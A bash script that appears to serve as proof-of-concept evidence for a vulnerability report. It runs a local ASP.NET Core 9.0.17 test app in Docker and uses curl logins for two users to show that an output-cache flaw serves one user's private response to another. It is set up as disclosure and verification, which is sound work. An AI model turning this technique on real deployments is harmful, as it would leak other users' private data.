#!/usr/bin/env bash
set -euo pipefail

PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORK_DIR="${PROJECT_DIR}/evidence-$(date -u +%Y%m%dT%H%M%SZ)"
PUBLISH_DIR="${WORK_DIR}/publish"
RUNTIME_VERSION="9.0.17"

mkdir -p "$PUBLISH_DIR"

for command in docker curl grep sha256sum; do
  command -v "$command" >/dev/null || {
    echo "Missing required command: $command" >&2
    exit 2
  }
done

cleanup() {
  docker rm -f outputcache-multi-unauth-first outputcache-multi-auth-first >/dev/null 2>&1 || true
}
trap cleanup EXIT
cleanup

printf 'Publishing multi-identity proof application...\n'
docker run --rm \
  -v "$PROJECT_DIR:/src" \
  -v "$PUBLISH_DIR:/out" \
  -w /src \
  mcr.microsoft.com/dotnet/sdk:9.0 \
  dotnet publish IncompleteFixProof.csproj \
    --configuration Release \
    --output /out \
    --nologo

run_order() {
  local order="$1"
  local port="$2"
  local container_name="$3"
  local expectation="$4"
  local case_dir="$WORK_DIR/$order"

  mkdir -p "$case_dir"

  docker run --rm "mcr.microsoft.com/dotnet/aspnet:${RUNTIME_VERSION}" dotnet --list-runtimes > "$case_dir/runtime-list.txt"
  grep -F "Microsoft.AspNetCore.App ${RUNTIME_VERSION}" "$case_dir/runtime-list.txt" >/dev/null

  docker run -d --rm \
    --name "$container_name" \
    -p "127.0.0.1:${port}:8080" \
    -e ASPNETCORE_URLS=http://+:8080 \
    -e "IDENTITY_ORDER=${order}" \
    -v "$PUBLISH_DIR:/app:ro" \
    -w /app \
    "mcr.microsoft.com/dotnet/aspnet:${RUNTIME_VERSION}" \
    dotnet IncompleteFixProof.dll \
    > "$case_dir/container-id.txt"

  for _ in $(seq 1 60); do
    if curl -fsS "http://127.0.0.1:${port}/health" >/dev/null; then
      break
    fi
    sleep 1
  done
  curl -fsS "http://127.0.0.1:${port}/health" > "$case_dir/health.txt"

  curl -sS -D "$case_dir/01-login-alice.headers" -o "$case_dir/01-login-alice.body" -c "$case_dir/alice.cookies" "http://127.0.0.1:${port}/login/alice"
  curl -sS -D "$case_dir/02-alice-private.headers" -o "$case_dir/02-alice-private.body" -b "$case_dir/alice.cookies" "http://127.0.0.1:${port}/private"
  curl -sS -D "$case_dir/03-login-bob.headers" -o "$case_dir/03-login-bob.body" -c "$case_dir/bob.cookies" "http://127.0.0.1:${port}/login/bob"
  curl -sS -D "$case_dir/04-bob-private.headers" -o "$case_dir/04-bob-private.body" -b "$case_dir/bob.cookies" "http://127.0.0.1:${port}/private"
  curl -sS -D "$case_dir/05-bob-nocache.headers" -o "$case_dir/05-bob-nocache.body" -b "$case_dir/bob.cookies" "http://127.0.0.1:${port}/private-nocache"
  curl -sS -D "$case_dir/06-anonymous-private.headers" -o "$case_dir/06-anonymous-private.body" -w '%{http_code}\n' "http://127.0.0.1:${port}/private" > "$case_dir/06-anonymous-private.status"

  docker logs "$container_name" > "$case_dir/container.log" 2>&1 || true
  docker rm -f "$container_name" >/dev/null

  {
    echo "RUNTIME_VERSION=${RUNTIME_VERSION}"
    echo "IDENTITY_ORDER=${order}"
    echo "EXPECTATION=${expectation}"
    echo "ALICE_LOGIN=$(cat "$case_dir/01-login-alice.body")"
    echo "ALICE_PRIVATE=$(cat "$case_dir/02-alice-private.body")"
    echo "BOB_LOGIN=$(cat "$case_dir/03-login-bob.body")"
    echo "BOB_PRIVATE=$(cat "$case_dir/04-bob-private.body")"
    echo "BOB_AGE_HEADER=$(grep -i '^age:' "$case_dir/04-bob-private.headers" | tr -d '\r' || true)"
    echo "BOB_NO_CACHE=$(cat "$case_dir/05-bob-nocache.body")"
    echo "ANONYMOUS_STATUS=$(cat "$case_dir/06-anonymous-private.status")"
    echo "ANONYMOUS_BODY=$(cat "$case_dir/06-anonymous-private.body")"
  } > "$case_dir/RESULT.txt"

  echo "===== DIAGNOSTIC: ${order} ====="
  cat "$case_dir/RESULT.txt"
  echo "--- Bob /private response headers ---"
  cat "$case_dir/04-bob-private.headers"
  echo "--- Alice cookie jar ---"
  sed -E 's/([[:space:]])[^[:space:]]+$/\1<redacted>/' "$case_dir/alice.cookies" || true
  echo "--- Bob cookie jar ---"
  sed -E 's/([[:space:]])[^[:space:]]+$/\1<redacted>/' "$case_dir/bob.cookies" || true
  echo "===== END DIAGNOSTIC: ${order} ====="

  grep -F "SIGNED_IN=alice;ORDER=${order}" "$case_dir/01-login-alice.body" >/dev/null
  grep -F "SIGNED_IN=bob;ORDER=${order}" "$case_dir/03-login-bob.body" >/dev/null
  grep -F 'NO_CACHE_USER=bob;ACCOUNT=account-bob' "$case_dir/05-bob-nocache.body" >/dev/null
  grep -Fx '401' "$case_dir/06-anonymous-private.status" >/dev/null

  if [[ "$expectation" == vulnerable ]]; then
    grep -F 'PRIMARY_AUTH=False;ANY_AUTH=True' "$case_dir/01-login-alice.body" >/dev/null
    grep -F 'PRIVATE_USER=alice;ACCOUNT=account-alice;EXEC_COUNT=1;PRIMARY_AUTH=False;ANY_AUTH=True;AUTH_METADATA=True;ALLOW_ANON=False;IDENTITY_COUNT=2' "$case_dir/02-alice-private.body" >/dev/null
    grep -F 'PRIVATE_USER=alice;ACCOUNT=account-alice;EXEC_COUNT=1;PRIMARY_AUTH=False;ANY_AUTH=True;AUTH_METADATA=True;ALLOW_ANON=False;IDENTITY_COUNT=2' "$case_dir/04-bob-private.body" >/dev/null
    grep -i '^age:' "$case_dir/04-bob-private.headers" >/dev/null
  else
    grep -F 'PRIMARY_AUTH=True;ANY_AUTH=True' "$case_dir/01-login-alice.body" >/dev/null
    grep -F 'PRIVATE_USER=alice;ACCOUNT=account-alice;EXEC_COUNT=1;PRIMARY_AUTH=True;ANY_AUTH=True;AUTH_METADATA=True;ALLOW_ANON=False;IDENTITY_COUNT=2' "$case_dir/02-alice-private.body" >/dev/null
    grep -F 'PRIVATE_USER=bob;ACCOUNT=account-bob;EXEC_COUNT=2;PRIMARY_AUTH=True;ANY_AUTH=True;AUTH_METADATA=True;ALLOW_ANON=False;IDENTITY_COUNT=2' "$case_dir/04-bob-private.body" >/dev/null
    if grep -i '^age:' "$case_dir/04-bob-private.headers" >/dev/null; then
      echo "Unexpected cached response for auth-first control." >&2
      exit 1
    fi
  fi
}

run_order 'unauth-first' '51917' 'outputcache-multi-unauth-first' vulnerable
run_order 'auth-first' '51918' 'outputcache-multi-auth-first' control

{
  echo 'VULN-187171 INCOMPLETE FIX PROOF'
  echo "UTC=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  echo
  echo '=== UNAUTHENTICATED PRIMARY IDENTITY / AUTHENTICATED SECONDARY IDENTITY ==='
  cat "$WORK_DIR/unauth-first/RESULT.txt"
  echo
  echo '=== AUTHENTICATED PRIMARY IDENTITY CONTROL ==='
  cat "$WORK_DIR/auth-first/RESULT.txt"
  echo
  echo 'VERDICT=With recommended middleware ordering, ASP.NET Core 9.0.17 authorizes the principal because any identity is authenticated, but DefaultPolicy checks only the primary identity and caches Alice output for Bob when the unauthenticated identity is first.'
} | tee "$WORK_DIR/SUMMARY.txt"

find "$WORK_DIR" -type f ! -name SHA256SUMS.txt -print0 | sort -z | xargs -0 sha256sum > "$WORK_DIR/SHA256SUMS.txt"
tar -C "$(dirname "$WORK_DIR")" -czf "${WORK_DIR}.tar.gz" "$(basename "$WORK_DIR")"
sha256sum "${WORK_DIR}.tar.gz" > "${WORK_DIR}.tar.gz.sha256"

printf '\nEvidence directory: %s\n' "$WORK_DIR"
printf 'Evidence archive: %s\n' "${WORK_DIR}.tar.gz"
printf 'Archive checksum: %s\n' "${WORK_DIR}.tar.gz.sha256"
